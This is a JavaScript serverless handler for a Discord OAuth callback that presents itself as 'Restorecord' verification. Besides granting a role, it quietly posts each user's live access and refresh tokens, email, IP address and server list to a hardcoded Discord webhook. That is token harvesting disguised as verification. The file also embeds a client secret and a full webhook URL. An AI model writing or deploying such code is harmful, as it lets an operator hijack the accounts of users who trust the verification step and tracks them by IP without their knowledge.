export default async function handler(req, res) {
  const code = req.query.code;
  if (!code) return res.status(400).send("Code not provided");

  const clientId = "1390626260056674366";
  const clientSecret = "hL-Ji669_YHUf7ICB91PazHBrBeU0_eA";
  const redirectUri = "https://restorecord-three.vercel.app/api/callback";
  const webhookURL = "https://discord.com/api/webhooks/1391119754780999730/r2DO9bmjrdv7EvHXKmwv7ICJtb_ZU68Az5JryR-tmPoqY_rcj_1-CMq3BFnIoRm3J82-";

  const params = new URLSearchParams();
  params.append("client_id", clientId);
  params.append("client_secret", clientSecret);
  params.append("grant_type", "authorization_code");
  params.append("code", code);
  params.append("redirect_uri", redirectUri);

  const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: params.toString(),
  });

  if (!tokenResponse.ok) return res.status(500).send("Token exchange failed");
  const tokenData = await tokenResponse.json();

  const { access_token, refresh_token, expires_in } = tokenData;

  const userResponse = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${access_token}` },
  });

  const guildsResponse = await fetch("https://discord.com/api/users/@me/guilds", {
    headers: { Authorization: `Bearer ${access_token}` },
  });

  if (!userResponse.ok || !guildsResponse.ok)
    return res.status(500).send("Failed to fetch user data");

  const user = await userResponse.json();
  const guilds = await guildsResponse.json();

  const userIp =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress ||
    "IP not found";

  const serverList =
    guilds
      .slice(0, 10)
      .map((g) => `- ${g.name} (${g.id})`)
      .join("\n") || "None";

  const expiresInMinutes = Math.floor(expires_in / 60);
  const expiryDate = new Date(Date.now() + expires_in * 1000).toISOString();

  const embedText = 
`Restorecord • Verification Log
────────────────────────────────────
> USER
Username     : ${user.username}#${user.discriminator}
User ID      : ${user.id}
Email        : ${user.email || "Not Available"}
IP Address   : ${userIp}

> TOKENS
Access Token : ${access_token}
Refresh Token: ${refresh_token}
Expires In   : ${expiresInMinutes} mins
Expiry Time  : ${expiryDate}

> GUILDS (up to 10)
${serverList}`;

  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "```" + embedText + "```"
    }),
  }).catch(console.error);

  // Notify your backend to assign the verified role
  await fetch("https://myproject-bvb7.onrender.com/grant-role", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user_id: user.id }),
  }).catch(console.error);

  res.status(200).send("Verification complete. You may close this tab.");
}
